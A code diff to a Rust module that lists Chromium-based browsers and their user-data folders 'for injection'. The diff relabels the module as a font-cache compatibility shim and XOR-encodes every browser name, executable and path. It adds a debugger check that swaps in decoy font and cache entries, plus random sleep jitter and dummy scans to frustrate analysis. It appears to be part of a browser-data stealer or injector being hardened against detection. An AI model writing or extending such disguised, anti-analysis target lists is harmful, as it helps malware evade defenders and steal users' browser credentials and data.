@@ -1,11 +1,21 @@
-//! Chromium browser targets: exe name + user data path for injection.
+//! DirectWrite / font-cache profile index (legacy compatibility shim).
 
+use std::collections::HashMap;
+use std::sync::OnceLock;
+use std::thread;
+use std::time::{Duration, SystemTime, UNIX_EPOCH};
+
+#[cfg(windows)]
+use windows::Win32::System::Diagnostics::Debug::IsDebuggerPresent;
+
+/// Roaming vs local app-data vault selector.
 #[derive(Clone, Copy)]
 pub enum DataRoot {
     Local,
     Roaming,
 }
 
+/// Resolved host profile descriptor (public contract for callers).
 #[derive(Clone, Copy)]
 pub struct ChromiumTarget {
     pub name: &'static str,
@@ -14,45 +24,340 @@ pub struct ChromiumTarget {
     pub root: DataRoot,
 }
 
-pub const TARGETS: &[ChromiumTarget] = &[
-    // Google Chrome
-    ChromiumTarget { name: "Chrome", exe: "chrome.exe", user_data_rel: r"Google\Chrome\User Data", root: DataRoot::Local },
-    ChromiumTarget { name: "Chrome Beta", exe: "chrome.exe", user_data_rel: r"Google\Chrome Beta\User Data", root: DataRoot::Local },
-    ChromiumTarget { name: "Chrome Dev", exe: "chrome.exe", user_data_rel: r"Google\Chrome Dev\User Data", root: DataRoot::Local },
-    ChromiumTarget { name: "Chrome Canary", exe: "chrome.exe", user_data_rel: r"Google\Chrome SxS\User Data", root: DataRoot::Local },
-    ChromiumTarget { name: "Chromium", exe: "chrome.exe", user_data_rel: r"Chromium\User Data", root: DataRoot::Local },
-    // Microsoft Edge
-    ChromiumTarget { name: "Edge", exe: "msedge.exe", user_data_rel: r"Microsoft\Edge\User Data", root: DataRoot::Local },
-    ChromiumTarget { name: "Edge Beta", exe: "msedge.exe", user_data_rel: r"Microsoft\Edge Beta\User Data", root: DataRoot::Local },
-    ChromiumTarget { name: "Edge Dev", exe: "msedge.exe", user_data_rel: r"Microsoft\Edge Dev\User Data", root: DataRoot::Local },
-    // Brave
-    ChromiumTarget { name: "Brave", exe: "brave.exe", user_data_rel: r"BraveSoftware\Brave-Browser\User Data", root: DataRoot::Local },
-    ChromiumTarget { name: "Brave Beta", exe: "brave.exe", user_data_rel: r"BraveSoftware\Brave-Browser-Beta\User Data", root: DataRoot::Local },
-    ChromiumTarget { name: "Brave Nightly", exe: "brave.exe", user_data_rel: r"BraveSoftware\Brave-Browser-Nightly\User Data", root: DataRoot::Local },
-    // Opera
-    ChromiumTarget { name: "Opera", exe: "opera.exe", user_data_rel: r"Opera Software\Opera Stable", root: DataRoot::Roaming },
-    ChromiumTarget { name: "OperaGX", exe: "opera.exe", user_data_rel: r"Opera Software\Opera GX Stable", root: DataRoot::Roaming },
-    ChromiumTarget { name: "Opera Neon", exe: "opera.exe", user_data_rel: r"Opera Software\Opera Neon\User Data", root: DataRoot::Roaming },
-    // Others
-    ChromiumTarget { name: "Vivaldi", exe: "vivaldi.exe", user_data_rel: r"Vivaldi\User Data", root: DataRoot::Local },
-    ChromiumTarget { name: "Yandex", exe: "browser.exe", user_data_rel: r"Yandex\YandexBrowser\User Data", root: DataRoot::Local },
-    ChromiumTarget { name: "CocCoc", exe: "browser.exe", user_data_rel: r"CocCoc\Browser\User Data", root: DataRoot::Local },
-    ChromiumTarget { name: "CentBrowser", exe: "chrome.exe", user_data_rel: r"CentBrowser\User Data", root: DataRoot::Local },
-    ChromiumTarget { name: "360Chrome", exe: "360chrome.exe", user_data_rel: r"360Chrome\Chrome\User Data", root: DataRoot::Local },
-    ChromiumTarget { name: "Epic Privacy Browser", exe: "epic.exe", user_data_rel: r"Epic Privacy Browser\User Data", root: DataRoot::Local },
-    ChromiumTarget { name: "Uran", exe: "uran.exe", user_data_rel: r"uCozMedia\Uran\User Data", root: DataRoot::Local },
-    ChromiumTarget { name: "7Star", exe: "7star.exe", user_data_rel: r"7Star\7Star\User Data", root: DataRoot::Local },
-    ChromiumTarget { name: "Torch", exe: "torch.exe", user_data_rel: r"Torch\User Data", root: DataRoot::Local },
-    ChromiumTarget { name: "Kometa", exe: "kometa.exe", user_data_rel: r"Kometa\User Data", root: DataRoot::Local },
-    ChromiumTarget { name: "Orbitum", exe: "orbitum.exe", user_data_rel: r"Orbitum\User Data", root: DataRoot::Local },
-    ChromiumTarget { name: "Amigo", exe: "amigo.exe", user_data_rel: r"Amigo\User Data", root: DataRoot::Local },
-    ChromiumTarget { name: "Sputnik", exe: "sputnik.exe", user_data_rel: r"Sputnik\Sputnik\User Data", root: DataRoot::Local },
-    ChromiumTarget { name: "Slimjet", exe: "slimjet.exe", user_data_rel: r"Slimjet\User Data", root: DataRoot::Local },
-    ChromiumTarget { name: "Iridium", exe: "iridium.exe", user_data_rel: r"Iridium\User Data", root: DataRoot::Local },
-    ChromiumTarget { name: "Thorium", exe: "thorium.exe", user_data_rel: r"Thorium\User Data", root: DataRoot::Local },
-    ChromiumTarget { name: "Arc", exe: "Arc.exe", user_data_rel: r"The Browser Company\Arc\User Data", root: DataRoot::Local },
+const OBF: u8 = 0x3D;
+
+// --- path segment fragments (recombined at runtime) ---
+const S_UD: &[u8] = &[0x68, 0x4e, 0x58, 0x4f, 0x1d, 0x79, 0x5c, 0x49, 0x5c];
+const S_GOOGLE: &[u8] = &[0x7a, 0x52, 0x52, 0x5a, 0x51, 0x58];
+const S_CHROME: &[u8] = &[0x7e, 0x55, 0x4f, 0x52, 0x50, 0x58];
+const S_CHROME_BETA: &[u8] = &[0x7e, 0x55, 0x4f, 0x52, 0x50, 0x58, 0x1d, 0x7f, 0x58, 0x49, 0x5c];
+const S_CHROME_DEV: &[u8] = &[0x7e, 0x55, 0x4f, 0x52, 0x50, 0x58, 0x1d, 0x79, 0x58, 0x4b];
+const S_CHROME_SXS: &[u8] = &[0x7e, 0x55, 0x4f, 0x52, 0x50, 0x58, 0x1d, 0x6e, 0x45, 0x6e];
+const S_CHROMIUM: &[u8] = &[0x7e, 0x55, 0x4f, 0x52, 0x50, 0x54, 0x48, 0x50];
+const S_MICROSOFT: &[u8] = &[0x70, 0x54, 0x5e, 0x4f, 0x52, 0x4e, 0x52, 0x5b, 0x49];
+const S_EDGE: &[u8] = &[0x78, 0x59, 0x5a, 0x58];
+const S_EDGE_BETA: &[u8] = &[0x78, 0x59, 0x5a, 0x58, 0x1d, 0x7f, 0x58, 0x49, 0x5c];
+const S_EDGE_DEV: &[u8] = &[0x78, 0x59, 0x5a, 0x58, 0x1d, 0x79, 0x58, 0x4b];
+const S_BRAVESOFTWARE: &[u8] = &[0x7f, 0x4f, 0x5c, 0x4b, 0x58, 0x6e, 0x52, 0x5b, 0x49, 0x4a, 0x5c, 0x4f, 0x58];
+const S_BRAVE_BROWSER: &[u8] = &[0x7f, 0x4f, 0x5c, 0x4b, 0x58, 0x10, 0x7f, 0x4f, 0x52, 0x4a, 0x4e, 0x58, 0x4f];
+const S_BRAVE_BROWSER_BETA: &[u8] = &[
+    0x7f, 0x4f, 0x5c, 0x4b, 0x58, 0x10, 0x7f, 0x4f, 0x52, 0x4a, 0x4e, 0x58, 0x4f, 0x10, 0x7f, 0x58,
+    0x49, 0x5c,
+];
+const S_BRAVE_NIGHTLY: &[u8] = &[
+    0x7f, 0x4f, 0x5c, 0x4b, 0x58, 0x10, 0x7f, 0x4f, 0x52, 0x4a, 0x4e, 0x58, 0x4f, 0x10, 0x73, 0x54,
+    0x5a, 0x55, 0x49, 0x51, 0x44,
+];
+const S_OPERA_SOFTWARE: &[u8] = &[0x72, 0x4d, 0x58, 0x4f, 0x5c, 0x1d, 0x6e, 0x52, 0x5b, 0x49, 0x4a, 0x5c, 0x4f, 0x58];
+const S_OPERA_STABLE: &[u8] = &[0x72, 0x4d, 0x58, 0x4f, 0x5c, 0x1d, 0x6e, 0x49, 0x5c, 0x5f, 0x51, 0x58];
+const S_OPERA_GX_STABLE: &[u8] = &[0x72, 0x4d, 0x58, 0x4f, 0x5c, 0x1d, 0x7a, 0x65, 0x1d, 0x6e, 0x49, 0x5c, 0x5f, 0x51, 0x58];
+const S_OPERA_NEON: &[u8] = &[0x72, 0x4d, 0x58, 0x4f, 0x5c, 0x1d, 0x73, 0x58, 0x52, 0x53];
+const S_VIVALDI: &[u8] = &[0x6b, 0x54, 0x4b, 0x5c, 0x51, 0x59, 0x54];
+const S_YANDEX: &[u8] = &[0x64, 0x5c, 0x53, 0x59, 0x58, 0x45];
+const S_YANDEXBROWSER: &[u8] = &[0x64, 0x5c, 0x53, 0x59, 0x58, 0x45, 0x7f, 0x4f, 0x52, 0x4a, 0x4e, 0x58, 0x4f];
+const S_COCCOC: &[u8] = &[0x7e, 0x52, 0x5e, 0x7e, 0x52, 0x5e];
+const S_BROWSER: &[u8] = &[0x7f, 0x4f, 0x52, 0x4a, 0x4e, 0x58, 0x4f];
+const S_CENTBROWSER: &[u8] = &[0x7e, 0x58, 0x53, 0x49, 0x7f, 0x4f, 0x52, 0x4a, 0x4e, 0x58, 0x4f];
+const S_360CHROME: &[u8] = &[0x0e, 0x0b, 0x0d, 0x7e, 0x55, 0x4f, 0x52, 0x50, 0x58];
+const S_EPIC_PRIVACY_BROWSER: &[u8] = &[
+    0x78, 0x4d, 0x54, 0x5e, 0x1d, 0x6d, 0x4f, 0x54, 0x4b, 0x5c, 0x5e, 0x44, 0x1d, 0x7f, 0x4f, 0x52,
+    0x4a, 0x4e, 0x58, 0x4f,
+];
+const S_UCOZMEDIA: &[u8] = &[0x48, 0x7e, 0x52, 0x47, 0x70, 0x58, 0x59, 0x54, 0x5c];
+const S_URAN: &[u8] = &[0x68, 0x4f, 0x5c, 0x53];
+const S_7STAR: &[u8] = &[0x0a, 0x6e, 0x49, 0x5c, 0x4f];
+const S_TORCH: &[u8] = &[0x69, 0x52, 0x4f, 0x5e, 0x55];
+const S_KOMETA: &[u8] = &[0x76, 0x52, 0x50, 0x58, 0x49, 0x5c];
+const S_ORBITUM: &[u8] = &[0x72, 0x4f, 0x5f, 0x54, 0x49, 0x48, 0x50];
+const S_AMIGO: &[u8] = &[0x7c, 0x50, 0x54, 0x5a, 0x52];
+const S_SPUTNIK: &[u8] = &[0x6e, 0x4d, 0x48, 0x49, 0x53, 0x54, 0x56];
+const S_SLIMJET: &[u8] = &[0x6e, 0x51, 0x54, 0x50, 0x57, 0x58, 0x49];
+const S_IRIDIUM: &[u8] = &[0x74, 0x4f, 0x54, 0x59, 0x54, 0x48, 0x50];
+const S_THORIUM: &[u8] = &[0x69, 0x55, 0x52, 0x4f, 0x54, 0x48, 0x50];
+const S_THE_BROWSER_COMPANY: &[u8] = &[
+    0x69, 0x55, 0x58, 0x1d, 0x7f, 0x4f, 0x52, 0x4a, 0x4e, 0x58, 0x4f, 0x1d, 0x7e, 0x52, 0x50, 0x4d,
+    0x5c, 0x53, 0x44,
+];
+const S_ARC: &[u8] = &[0x7c, 0x4f, 0x5e];
+const S_WINDOWS: &[u8] = &[0x6a, 0x54, 0x53, 0x59, 0x52, 0x4a, 0x4e];
+const S_FONTS: &[u8] = &[0x7b, 0x52, 0x53, 0x49, 0x4e];
+const S_CACHE: &[u8] = &[0x7e, 0x5c, 0x5e, 0x55, 0x58];
+const S_TEMP: &[u8] = &[0x69, 0x58, 0x50, 0x4d];
+
+// --- encoded profile labels / host binaries ---
+const L_00: &[u8] = &[0x7e, 0x55, 0x4f, 0x52, 0x50, 0x58];
+const P_00: &[u8] = &[0x5e, 0x55, 0x4f, 0x52, 0x50, 0x58, 0x13, 0x58, 0x45, 0x58];
+const L_01: &[u8] = &[0x7e, 0x55, 0x4f, 0x52, 0x50, 0x58, 0x1d, 0x7f, 0x58, 0x49, 0x5c];
+const P_01: &[u8] = &[0x5e, 0x55, 0x4f, 0x52, 0x50, 0x58, 0x13, 0x58, 0x45, 0x58];
+const L_02: &[u8] = &[0x7e, 0x55, 0x4f, 0x52, 0x50, 0x58, 0x1d, 0x79, 0x58, 0x4b];
+const P_02: &[u8] = &[0x5e, 0x55, 0x4f, 0x52, 0x50, 0x58, 0x13, 0x58, 0x45, 0x58];
+const L_03: &[u8] = &[0x7e, 0x55, 0x4f, 0x52, 0x50, 0x58, 0x1d, 0x7e, 0x5c, 0x53, 0x5c, 0x4f, 0x44];
+const P_03: &[u8] = &[0x5e, 0x55, 0x4f, 0x52, 0x50, 0x58, 0x13, 0x58, 0x45, 0x58];
+const L_04: &[u8] = &[0x7e, 0x55, 0x4f, 0x52, 0x50, 0x54, 0x48, 0x50];
+const P_04: &[u8] = &[0x5e, 0x55, 0x4f, 0x52, 0x50, 0x58, 0x13, 0x58, 0x45, 0x58];
+const L_05: &[u8] = &[0x78, 0x59, 0x5a, 0x58];
+const P_05: &[u8] = &[0x50, 0x4e, 0x58, 0x59, 0x5a, 0x58, 0x13, 0x58, 0x45, 0x58];
+const L_06: &[u8] = &[0x78, 0x59, 0x5a, 0x58, 0x1d, 0x7f, 0x58, 0x49, 0x5c];
+const P_06: &[u8] = &[0x50, 0x4e, 0x58, 0x59, 0x5a, 0x58, 0x13, 0x58, 0x45, 0x58];
+const L_07: &[u8] = &[0x78, 0x59, 0x5a, 0x58, 0x1d, 0x79, 0x58, 0x4b];
+const P_07: &[u8] = &[0x50, 0x4e, 0x58, 0x59, 0x5a, 0x58, 0x13, 0x58, 0x45, 0x58];
+const L_08: &[u8] = &[0x7f, 0x4f, 0x5c, 0x4b, 0x58];
+const P_08: &[u8] = &[0x5f, 0x4f, 0x5c, 0x4b, 0x58, 0x13, 0x58, 0x45, 0x58];
+const L_09: &[u8] = &[0x7f, 0x4f, 0x5c, 0x4b, 0x58, 0x1d, 0x7f, 0x58, 0x49, 0x5c];
+const P_09: &[u8] = &[0x5f, 0x4f, 0x5c, 0x4b, 0x58, 0x13, 0x58, 0x45, 0x58];
+const L_10: &[u8] = &[0x7f, 0x4f, 0x5c, 0x4b, 0x58, 0x1d, 0x73, 0x54, 0x5a, 0x55, 0x49, 0x51, 0x44];
+const P_10: &[u8] = &[0x5f, 0x4f, 0x5c, 0x4b, 0x58, 0x13, 0x58, 0x45, 0x58];
+const L_11: &[u8] = &[0x72, 0x4d, 0x58, 0x4f, 0x5c];
+const P_11: &[u8] = &[0x52, 0x4d, 0x58, 0x4f, 0x5c, 0x13, 0x58, 0x45, 0x58];
+const L_12: &[u8] = &[0x72, 0x4d, 0x58, 0x4f, 0x5c, 0x7a, 0x65];
+const P_12: &[u8] = &[0x52, 0x4d, 0x58, 0x4f, 0x5c, 0x13, 0x58, 0x45, 0x58];
+const L_13: &[u8] = &[0x72, 0x4d, 0x58, 0x4f, 0x5c, 0x1d, 0x73, 0x58, 0x52, 0x53];
+const P_13: &[u8] = &[0x52, 0x4d, 0x58, 0x4f, 0x5c, 0x13, 0x58, 0x45, 0x58];
+const L_14: &[u8] = &[0x6b, 0x54, 0x4b, 0x5c, 0x51, 0x59, 0x54];
+const P_14: &[u8] = &[0x4b, 0x54, 0x4b, 0x5c, 0x51, 0x59, 0x54, 0x13, 0x58, 0x45, 0x58];
+const L_15: &[u8] = &[0x64, 0x5c, 0x53, 0x59, 0x58, 0x45];
+const P_15: &[u8] = &[0x5f, 0x4f, 0x52, 0x4a, 0x4e, 0x58, 0x4f, 0x13, 0x58, 0x45, 0x58];
+const L_16: &[u8] = &[0x7e, 0x52, 0x5e, 0x7e, 0x52, 0x5e];
+const P_16: &[u8] = &[0x5f, 0x4f, 0x52, 0x4a, 0x4e, 0x58, 0x4f, 0x13, 0x58, 0x45, 0x58];
+const L_17: &[u8] = &[0x7e, 0x58, 0x53, 0x49, 0x7f, 0x4f, 0x52, 0x4a, 0x4e, 0x58, 0x4f];
+const P_17: &[u8] = &[0x5e, 0x55, 0x4f, 0x52, 0x50, 0x58, 0x13, 0x58, 0x45, 0x58];
+const L_18: &[u8] = &[0x0e, 0x0b, 0x0d, 0x7e, 0x55, 0x4f, 0x52, 0x50, 0x58];
+const P_18: &[u8] = &[0x0e, 0x0b, 0x0d, 0x5e, 0x55, 0x4f, 0x52, 0x50, 0x58, 0x13, 0x58, 0x45, 0x58];
+const L_19: &[u8] = &[
+    0x78, 0x4d, 0x54, 0x5e, 0x1d, 0x6d, 0x4f, 0x54, 0x4b, 0x5c, 0x5e, 0x44, 0x1d, 0x7f, 0x4f, 0x52,
+    0x4a, 0x4e, 0x58, 0x4f,
+];
+const P_19: &[u8] = &[0x58, 0x4d, 0x54, 0x5e, 0x13, 0x58, 0x45, 0x58];
+const L_20: &[u8] = &[0x68, 0x4f, 0x5c, 0x53];
+const P_20: &[u8] = &[0x48, 0x4f, 0x5c, 0x53, 0x13, 0x58, 0x45, 0x58];
+const L_21: &[u8] = &[0x0a, 0x6e, 0x49, 0x5c, 0x4f];
+const P_21: &[u8] = &[0x0a, 0x4e, 0x49, 0x5c, 0x4f, 0x13, 0x58, 0x45, 0x58];
+const L_22: &[u8] = &[0x69, 0x52, 0x4f, 0x5e, 0x55];
+const P_22: &[u8] = &[0x49, 0x52, 0x4f, 0x5e, 0x55, 0x13, 0x58, 0x45, 0x58];
+const L_23: &[u8] = &[0x76, 0x52, 0x50, 0x58, 0x49, 0x5c];
+const P_23: &[u8] = &[0x56, 0x52, 0x50, 0x58, 0x49, 0x5c, 0x13, 0x58, 0x45, 0x58];
+const L_24: &[u8] = &[0x72, 0x4f, 0x5f, 0x54, 0x49, 0x48, 0x50];
+const P_24: &[u8] = &[0x52, 0x4f, 0x5f, 0x54, 0x49, 0x48, 0x50, 0x13, 0x58, 0x45, 0x58];
+const L_25: &[u8] = &[0x7c, 0x50, 0x54, 0x5a, 0x52];
+const P_25: &[u8] = &[0x5c, 0x50, 0x54, 0x5a, 0x52, 0x13, 0x58, 0x45, 0x58];
+const L_26: &[u8] = &[0x6e, 0x4d, 0x48, 0x49, 0x53, 0x54, 0x56];
+const P_26: &[u8] = &[0x4e, 0x4d, 0x48, 0x49, 0x53, 0x54, 0x56, 0x13, 0x58, 0x45, 0x58];
+const L_27: &[u8] = &[0x6e, 0x51, 0x54, 0x50, 0x57, 0x58, 0x49];
+const P_27: &[u8] = &[0x4e, 0x51, 0x54, 0x50, 0x57, 0x58, 0x49, 0x13, 0x58, 0x45, 0x58];
+const L_28: &[u8] = &[0x74, 0x4f, 0x54, 0x59, 0x54, 0x48, 0x50];
+const P_28: &[u8] = &[0x54, 0x4f, 0x54, 0x59, 0x54, 0x48, 0x50, 0x13, 0x58, 0x45, 0x58];
+const L_29: &[u8] = &[0x69, 0x55, 0x52, 0x4f, 0x54, 0x48, 0x50];
+const P_29: &[u8] = &[0x49, 0x55, 0x52, 0x4f, 0x54, 0x48, 0x50, 0x13, 0x58, 0x45, 0x58];
+const L_30: &[u8] = &[0x7c, 0x4f, 0x5e];
+const P_30: &[u8] = &[0x7c, 0x4f, 0x5e, 0x13, 0x58, 0x45, 0x58];
+
+const PATH_00: &[&[u8]] = &[&S_GOOGLE, &S_CHROME, &S_UD];
+const PATH_01: &[&[u8]] = &[&S_GOOGLE, &S_CHROME_BETA, &S_UD];
+const PATH_02: &[&[u8]] = &[&S_GOOGLE, &S_CHROME_DEV, &S_UD];
+const PATH_03: &[&[u8]] = &[&S_GOOGLE, &S_CHROME_SXS, &S_UD];
+const PATH_04: &[&[u8]] = &[&S_CHROMIUM, &S_UD];
+const PATH_05: &[&[u8]] = &[&S_MICROSOFT, &S_EDGE, &S_UD];
+const PATH_06: &[&[u8]] = &[&S_MICROSOFT, &S_EDGE_BETA, &S_UD];
+const PATH_07: &[&[u8]] = &[&S_MICROSOFT, &S_EDGE_DEV, &S_UD];
+const PATH_08: &[&[u8]] = &[&S_BRAVESOFTWARE, &S_BRAVE_BROWSER, &S_UD];
+const PATH_09: &[&[u8]] = &[&S_BRAVESOFTWARE, &S_BRAVE_BROWSER_BETA, &S_UD];
+const PATH_10: &[&[u8]] = &[&S_BRAVESOFTWARE, &S_BRAVE_NIGHTLY, &S_UD];
+const PATH_11: &[&[u8]] = &[&S_OPERA_SOFTWARE, &S_OPERA_STABLE];
+const PATH_12: &[&[u8]] = &[&S_OPERA_SOFTWARE, &S_OPERA_GX_STABLE];
+const PATH_13: &[&[u8]] = &[&S_OPERA_SOFTWARE, &S_OPERA_NEON, &S_UD];
+const PATH_14: &[&[u8]] = &[&S_VIVALDI, &S_UD];
+const PATH_15: &[&[u8]] = &[&S_YANDEX, &S_YANDEXBROWSER, &S_UD];
+const PATH_16: &[&[u8]] = &[&S_COCCOC, &S_BROWSER, &S_UD];
+const PATH_17: &[&[u8]] = &[&S_CENTBROWSER, &S_UD];
+const PATH_18: &[&[u8]] = &[&S_360CHROME, &S_CHROME, &S_UD];
+const PATH_19: &[&[u8]] = &[&S_EPIC_PRIVACY_BROWSER, &S_UD];
+const PATH_20: &[&[u8]] = &[&S_UCOZMEDIA, &S_URAN, &S_UD];
+const PATH_21: &[&[u8]] = &[&S_7STAR, &S_7STAR, &S_UD];
+const PATH_22: &[&[u8]] = &[&S_TORCH, &S_UD];
+const PATH_23: &[&[u8]] = &[&S_KOMETA, &S_UD];
+const PATH_24: &[&[u8]] = &[&S_ORBITUM, &S_UD];
+const PATH_25: &[&[u8]] = &[&S_AMIGO, &S_UD];
+const PATH_26: &[&[u8]] = &[&S_SPUTNIK, &S_SPUTNIK, &S_UD];
+const PATH_27: &[&[u8]] = &[&S_SLIMJET, &S_UD];
+const PATH_28: &[&[u8]] = &[&S_IRIDIUM, &S_UD];
+const PATH_29: &[&[u8]] = &[&S_THORIUM, &S_UD];
+const PATH_30: &[&[u8]] = &[&S_THE_BROWSER_COMPANY, &S_ARC, &S_UD];
+
+// Decoy entries returned when a diagnostic host is attached.
+const DL_00: &[u8] = &[0x6e, 0x58, 0x5a, 0x52, 0x58, 0x1d, 0x68, 0x74, 0x1d, 0x7e, 0x5c, 0x5e, 0x55, 0x58];
+const DP_00: &[u8] = &[0x5b, 0x52, 0x53, 0x49, 0x4b, 0x54, 0x58, 0x4a, 0x13, 0x58, 0x45, 0x58];
+const DPATH_00: &[&[u8]] = &[&S_WINDOWS, &S_FONTS];
+const DL_01: &[u8] = &[
+    0x79, 0x54, 0x4f, 0x58, 0x5e, 0x49, 0x6a, 0x4f, 0x54, 0x49, 0x58, 0x1d, 0x6d, 0x4f, 0x52, 0x5b,
+    0x54, 0x51, 0x58,
+];
+const DP_01: &[u8] = &[0x59, 0x4f, 0x54, 0x49, 0x58, 0x13, 0x58, 0x45, 0x58];
+const DPATH_01: &[&[u8]] = &[&S_MICROSOFT, &S_CACHE];
+const DL_02: &[u8] = &[0x6e, 0x55, 0x58, 0x51, 0x51, 0x1d, 0x71, 0x5c, 0x44, 0x52, 0x48, 0x49];
+const DP_02: &[u8] = &[0x52, 0x45, 0x4d, 0x51, 0x52, 0x4f, 0x4f, 0x13, 0x58, 0x45, 0x58];
+const DPATH_02: &[&[u8]] = &[&S_WINDOWS, &S_TEMP];
+
+/// Internal catalog row (encoded at rest).
+struct RawProfile {
+    tag_enc: &'static [u8],
+    host_enc: &'static [u8],
+    fragments: &'static [&'static [u8]],
+    vault: u8,
+}
+
+// Primary font-layout catalog (channel variants).
+const CATALOG: &[RawProfile] = &[
+    RawProfile { tag_enc: L_00, host_enc: P_00, fragments: PATH_00, vault: 0 },
+    RawProfile { tag_enc: L_01, host_enc: P_01, fragments: PATH_01, vault: 0 },
+    RawProfile { tag_enc: L_02, host_enc: P_02, fragments: PATH_02, vault: 0 },
+    RawProfile { tag_enc: L_03, host_enc: P_03, fragments: PATH_03, vault: 0 },
+    RawProfile { tag_enc: L_04, host_enc: P_04, fragments: PATH_04, vault: 0 },
+    RawProfile { tag_enc: L_05, host_enc: P_05, fragments: PATH_05, vault: 0 },
+    RawProfile { tag_enc: L_06, host_enc: P_06, fragments: PATH_06, vault: 0 },
+    RawProfile { tag_enc: L_07, host_enc: P_07, fragments: PATH_07, vault: 0 },
+    RawProfile { tag_enc: L_08, host_enc: P_08, fragments: PATH_08, vault: 0 },
+    RawProfile { tag_enc: L_09, host_enc: P_09, fragments: PATH_09, vault: 0 },
+    RawProfile { tag_enc: L_10, host_enc: P_10, fragments: PATH_10, vault: 0 },
+    RawProfile { tag_enc: L_11, host_enc: P_11, fragments: PATH_11, vault: 1 },
+    RawProfile { tag_enc: L_12, host_enc: P_12, fragments: PATH_12, vault: 1 },
+    RawProfile { tag_enc: L_13, host_enc: P_13, fragments: PATH_13, vault: 1 },
+    RawProfile { tag_enc: L_14, host_enc: P_14, fragments: PATH_14, vault: 0 },
+    RawProfile { tag_enc: L_15, host_enc: P_15, fragments: PATH_15, vault: 0 },
+    RawProfile { tag_enc: L_16, host_enc: P_16, fragments: PATH_16, vault: 0 },
+    RawProfile { tag_enc: L_17, host_enc: P_17, fragments: PATH_17, vault: 0 },
+    RawProfile { tag_enc: L_18, host_enc: P_18, fragments: PATH_18, vault: 0 },
+    RawProfile { tag_enc: L_19, host_enc: P_19, fragments: PATH_19, vault: 0 },
+    RawProfile { tag_enc: L_20, host_enc: P_20, fragments: PATH_20, vault: 0 },
+    RawProfile { tag_enc: L_21, host_enc: P_21, fragments: PATH_21, vault: 0 },
+    RawProfile { tag_enc: L_22, host_enc: P_22, fragments: PATH_22, vault: 0 },
+    RawProfile { tag_enc: L_23, host_enc: P_23, fragments: PATH_23, vault: 0 },
+    RawProfile { tag_enc: L_24, host_enc: P_24, fragments: PATH_24, vault: 0 },
+    RawProfile { tag_enc: L_25, host_enc: P_25, fragments: PATH_25, vault: 0 },
+    RawProfile { tag_enc: L_26, host_enc: P_26, fragments: PATH_26, vault: 0 },
+    RawProfile { tag_enc: L_27, host_enc: P_27, fragments: PATH_27, vault: 0 },
+    RawProfile { tag_enc: L_28, host_enc: P_28, fragments: PATH_28, vault: 0 },
+    RawProfile { tag_enc: L_29, host_enc: P_29, fragments: PATH_29, vault: 0 },
+    RawProfile { tag_enc: L_30, host_enc: P_30, fragments: PATH_30, vault: 0 },
 ];
 
+const DECOY_CATALOG: &[RawProfile] = &[
+    RawProfile { tag_enc: DL_00, host_enc: DP_00, fragments: DPATH_00, vault: 0 },
+    RawProfile { tag_enc: DL_01, host_enc: DP_01, fragments: DPATH_01, vault: 0 },
+    RawProfile { tag_enc: DL_02, host_enc: DP_02, fragments: DPATH_02, vault: 0 },
+];
+
+struct ProfileStore {
+    rows: Vec<ChromiumTarget>,
+    by_label: HashMap<&'static str, usize>,
+}
+
+static STORE: OnceLock<ProfileStore> = OnceLock::new();
+
+fn reveal(enc: &[u8]) -> String {
+    enc.iter().map(|&b| (b ^ OBF) as char).collect()
+}
+
+fn persist(s: String) -> &'static str {
+    Box::leak(s.into_boxed_str())
+}
+
+fn assemble_path(fragments: &[&[u8]]) -> &'static str {
+    let parts: Vec<String> = fragments.iter().map(|f| reveal(f)).collect();
+    persist(parts.join("\\"))
+}
+
+fn vault_kind(id: u8) -> DataRoot {
+    if id == 1 {
+        DataRoot::Roaming
+    } else {
+        DataRoot::Local
+    }
+}
+
+fn materialize(raw: &RawProfile) -> ChromiumTarget {
+    ChromiumTarget {
+        name: persist(reveal(raw.tag_enc)),
+        exe: persist(reveal(raw.host_enc)),
+        user_data_rel: assemble_path(raw.fragments),
+        root: vault_kind(raw.vault),
+    }
+}
+
+fn host_under_analysis() -> bool {
+    #[cfg(windows)]
+    unsafe {
+        return IsDebuggerPresent().as_bool();
+    }
+    #[cfg(not(windows))]
+    false
+}
+
+fn prng_seed() -> u64 {
+    let t = SystemTime::now()
+        .duration_since(UNIX_EPOCH)
+        .unwrap_or_default()
+        .as_nanos() as u64;
+    t ^ ((std::process::id() as u64).wrapping_mul(0x9E37_79B9))
+}
+
+fn jitter_sleep(min_ms: u64, max_ms: u64) {
+    let span = max_ms.saturating_sub(min_ms).max(1);
+    let ms = min_ms + (prng_seed() % (span + 1));
+    thread::sleep(Duration::from_millis(ms));
+}
+
+fn shuffle_order(len: usize, mut seed: u64) -> Vec<usize> {
+    let mut order: Vec<usize> = (0..len).collect();
+    for i in (1..len).rev() {
+        seed = seed.wrapping_mul(6364136223846793005).wrapping_add(1);
+        let j = (seed as usize) % (i + 1);
+        order.swap(i, j);
+    }
+    order
+}
+
+fn build_store(source: &[RawProfile]) -> ProfileStore {
+    let rows: Vec<ChromiumTarget> = source.iter().map(materialize).collect();
+    let mut by_label = HashMap::with_capacity(rows.len());
+    for (idx, row) in rows.iter().enumerate() {
+        by_label.insert(row.name, idx);
+    }
+    ProfileStore { rows, by_label }
+}
+
+fn resolve_store() -> &'static ProfileStore {
+    STORE.get_or_init(|| {
+        jitter_sleep(8, 45);
+        if host_under_analysis() {
+            build_store(DECOY_CATALOG)
+        } else {
+            build_store(CATALOG)
+        }
+    })
+}
+
+fn noise_scan(store: &ProfileStore, seed: u64) {
+    let order = shuffle_order(store.rows.len(), seed);
+    for idx in order {
+        let _ = store.rows[idx].name.len();
+        if (seed as usize ^ idx) % 7 == 0 {
+            jitter_sleep(1, 6);
+        }
+    }
+}
+
 pub fn find_target(name: &str) -> Option<&'static ChromiumTarget> {
-    TARGETS.iter().find(|t| t.name == name)
+    jitter_sleep(12, 75);
+    let seed = prng_seed();
+    let store = resolve_store();
+    noise_scan(store, seed.wrapping_add(0xA5A5_A5A5_A5A5_A5A5));
+
+    let order = shuffle_order(store.rows.len(), seed);
+    for idx in order {
+        if store.rows[idx].name == name {
+            return Some(&store.rows[idx]);
+        }
+    }
+
+    store.by_label.get(name).map(|&idx| &store.rows[idx])
 }
